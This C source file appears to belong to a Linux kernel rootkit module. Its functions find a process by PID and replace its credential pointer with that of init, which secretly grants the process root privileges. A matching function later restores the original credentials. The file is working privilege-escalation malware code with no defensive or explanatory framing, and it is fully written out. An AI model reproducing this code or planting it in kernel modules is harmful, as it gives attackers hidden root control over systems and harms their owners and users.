/*
 * privileged_escalation.c
 *
 *  Created on: Dec 9, 2018
 *      Author: benjamin
 */


#include "hook.h"
#include "list.h"

#include <linux/sched.h>
#include <linux/cred.h>

struct hooked_tasks{
	unsigned int pid;
	struct cred *credential_p;
};

list_t *privileged_task_list;

/*
 * gives a pointer to the task struct of an PID.
 */
struct task_struct *get_task_from_pid(unsigned int pid){
	struct pid *pid_s;
	struct task_struct *task;
	pid_s = find_vpid(pid); /* find the pid in the ccurrent namespace */
	if(pid_s == NULL){
		return NULL;
	}
	task = pid_task(pid_s, PIDTYPE_PID);
	return task;
}


/*
 * gives an process with a PID root privileges.
 */
void give_root(unsigned int pid){
	struct task_struct *task, *init_task;
	struct hooked_tasks *hook_data;
	task = get_task_from_pid(pid);
	if(task == NULL){
		return;
	}
	init_task = get_task_from_pid(1);
	if(init_task == NULL){
		return;
	}
	hook_data = kmalloc(sizeof(struct hooked_tasks), GFP_KERNEL);
	hook_data->pid = pid;
	hook_data->credential_p = task->cred;
	list_append(privileged_task_list, hook_data);
	task->cred = init_task->cred; /* give the new task same credential as the init task */
}

static int search_for_pid_in_list(void *search_for, void *search_in){
	unsigned int *pid_s_f, *pid_s_i;
	struct hooked_tasks *search_in_s;

	search_in_s = (struct hooked_tasks *)search_in;
	pid_s_i = (unsigned int *)search_in_s;
	pid_s_f = (unsigned int *)search_for;
	if(*pid_s_i == *pid_s_f){
		return 0;
	}
	return -1;
}

/*
 * Take the root pivilege of a process and give original privileges back.
 */
void redo_root(unsigned int pid){
	struct list_elem *tmp;
	struct hooked_tasks *delete_me;
	struct task_struct *task;


	tmp = list_find(privileged_task_list, &pid, search_for_pid_in_list);
	if(tmp != NULL){
		delete_me = tmp->data;
		task = get_task_from_pid(pid);
		task->cred = delete_me->credential_p;
		list_remove(privileged_task_list, tmp);
		kfree(delete_me);
	}
}


void initialize_privileged_tasks(void){
	privileged_task_list = list_init();
}


void cleanup_privileged_tasks(void){
	list_cleanup_with_data_clean(privileged_task_list);
}
